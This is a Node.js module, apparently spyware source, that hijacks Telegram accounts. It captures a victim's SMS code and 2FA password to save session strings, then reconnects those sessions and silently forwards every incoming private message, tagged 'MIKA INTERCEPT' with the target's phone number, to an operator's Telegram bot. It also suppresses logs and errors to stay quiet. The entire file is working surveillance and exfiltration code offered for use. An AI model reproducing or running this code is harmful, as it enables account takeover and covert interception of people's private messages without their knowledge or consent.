const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const { Logger } = require("telegram/extensions/Logger");
const axios = require('axios');
const input = require('input');

// GAG THE LIBRARY. SHUT UP.
Logger.setLevel("none");

class WarMachine {
    constructor(apiId, apiHash) {
        this.apiId = parseInt(apiId);
        this.apiHash = apiHash;
        this.activeGuns = new Map();
    }

    async hijack(phone) {
        const client = new TelegramClient(new StringSession(""), this.apiId, this.apiHash, {
            deviceModel: "MIKA God Mode",
            appVersion: "69.4.20",
            systemVersion: "Windows 11 Pro",
            connectionRetries: 5,
            useWSS: false // Sometimes TCP is more stable
        });

        // Suppress internal error prints
        client.setLogLevel("none");

        await client.start({
            phoneNumber: phone,
            password: async () => await input.text("2FA Password (don't f*ck it up): "),
            phoneCode: async () => await input.text("SMS Code (check the phone): "),
            onError: (err) => {}, // Eat the error silently
        });

        const str = client.session.save();
        const me = await client.getMe();
        await client.disconnect();
        
        return { session: str, me };
    }

    async snitchToBot(botToken, adminId, text) {
        try {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await axios.post(url, {
                chat_id: adminId,
                text: text,
                parse_mode: 'HTML'
            });
        } catch (e) {
            // If bot fails, don't crash the whole matrix. Just ignore.
        }
    }

    async wakeUpNeo(sessions, botConfig, callback) {
        const promises = sessions.map(async (s) => {
            try {
                const client = new TelegramClient(new StringSession(s.session), this.apiId, this.apiHash, {
                    connectionRetries: 2,
                    autoReconnect: true
                });
                
                client.setLogLevel("none"); // SHUSH
                await client.connect();
                
                client.addEventHandler(async (event) => {
                    const msg = event.message;
                    if(msg && msg.message) {
                        const sender = msg.senderId ? msg.senderId.toString() : 'Ghost';
                        const cleanText = msg.message.replace(/\n/g, ' ');
                        
                        // Callback for CLI display
                        callback({
                            phone: s.phone,
                            text: msg.message,
                            sender: sender
                        });

                        // SNITCH MODE
                        if (botConfig && botConfig.token && botConfig.admin) {
                            const report = `<b>⚠️ MIKA INTERCEPT</b>\n\n<b>Target:</b> <code>${s.phone}</code>\n<b>From:</b> <code>${sender}</code>\n\n${cleanText}`;
                            await this.snitchToBot(botConfig.token, botConfig.admin, report);
                        }
                    }
                }, new NewMessage({}));
                
                this.activeGuns.set(s.phone, client);
            } catch (e) {
                // Dead session, ignore
            }
        });
        await Promise.all(promises);
        return this.activeGuns.size;
    }
}

module.exports = { WarMachine };
